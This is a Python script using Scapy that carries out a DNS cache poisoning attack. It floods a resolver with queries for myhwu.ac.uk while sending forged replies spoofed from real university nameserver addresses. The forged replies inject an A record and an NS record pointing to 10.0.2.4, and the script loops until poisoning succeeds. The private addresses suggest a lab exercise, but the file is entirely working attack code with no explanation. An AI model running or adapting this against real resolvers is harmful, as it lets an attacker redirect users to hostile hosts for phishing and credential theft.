from scapy.all import *
from time import sleep
import threading
import random
import sys

# Set the domain name and DNS server IP
domain = "myhwu.ac.uk"
dns_server = "10.0.1.2"
nameserver_ip = "137.195.101.250" # or "137.195.151.105"

def send_queries():
    id = random.randint(0, 65535)
    for i in range(256):
        query_packet = IP(dst=dns_server)/UDP(dport=53)/DNS(id=id, rd=1, qd=DNSQR(qname=domain))
        send(query_packet)

def send_response():
    for i in range(700):
        id = random.randint(0, 65535)
        dns_reply = IP(dst="10.0.0.2", src=nameserver_ip) / UDP(dport=33333, sport=53) / DNS(id=id, qr=1, opcode=0, aa=1, tc=0, rd=1, ra=1, z=0, rcode=0, 
                                                                                             qdcount=1, ancount=1, nscount=1, arcount=1,
                                                                                            qd=DNSQR(qname=domain, qtype="A", qclass="IN"),
                                                                                            an=DNSRR(rrname=domain, type="A", rclass="IN", ttl=259200, rdata="10.0.2.4"),
                                                                                            ns=DNSRR(rrname=domain,type='NS',rclass="IN", ttl=259200, rdata='ns.hw.ac.uk'),
                                                                                            ar=DNSRR(rrname="ns.hw.ac.uk", type="A", rclass="IN", ttl=259200, rdata="10.0.2.4"))
        send(dns_reply, verbose=False)


while True:
    send_thread = threading.Thread(target=send_queries)
    send_thread.start()
    
    send_response()

    query_packet = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    # Send DNS query and receive response to check if attack worked
    response = sr1(query_packet, verbose=False)

    # Print DNS response
    if response and response.haslayer(DNSRR):
        for rr in response[DNS].an:
            if rr.type == 1:  # A record
                if rr.rdata == '10.0.2.4':
                    print("DNS response contains the IP 10.0.2.4.")
                    exit()
                else:
                    print("DNS response does not contain the IP 10.0.2.4.")
        print("No A record found in the DNS response.")
    else:
        print("No response received.")

    sleep(1)